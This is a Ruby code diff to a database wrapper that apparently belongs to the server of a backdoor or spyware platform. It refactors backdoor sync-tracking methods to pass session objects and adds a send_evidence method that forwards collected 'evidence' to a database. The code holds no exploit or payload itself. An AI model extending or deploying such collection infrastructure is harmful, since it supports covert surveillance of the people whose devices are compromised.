@@ -79,6 +79,7 @@ class DB
 
   def disconnect!
     @db.logout
+    @db_rest.logout
     @available = false
     trace :info, "Disconnected from [#{@host}]"
   end
@@ -222,27 +223,33 @@ class DB
     return (status.nil?) ? [DB::UNKNOWN_BACKDOOR, 0] : [status, bid]
   end
 
-  def sync_start(bid, version, user, device, source, time)
+  def sync_start(session, version, user, device, source, time)
     # database is down, continue
     return unless @available
 
     # tell the db that the backdoor has synchronized
-    db_call :sync_start, bid, version, user, device, source, time
-    db_rest_call :sync_start, bid, version, user, device, source, time
+    db_call :sync_start, session['bid'], version, user, device, source, time
+    db_rest_call :sync_start, session, version, user, device, source, time
   end
 
-  def sync_timeout(bid)
+  def sync_timeout(session)
     # database is down, continue
     return unless @available
 
-    db_rest_call :sync_timeout, bid
+    db_rest_call :sync_timeout, session
   end
 
-  def sync_end(bid)
+  def sync_end(session)
     # database is down, continue
     return unless @available
 
-    db_rest_call :sync_end, bid
+    db_rest_call :sync_end, session
+  end
+
+  def send_evidence(instance, evidence)
+    return unless @available
+
+    db_rest_call :send_evidence, instance, evidence
   end
 
   def new_conf?(bid)
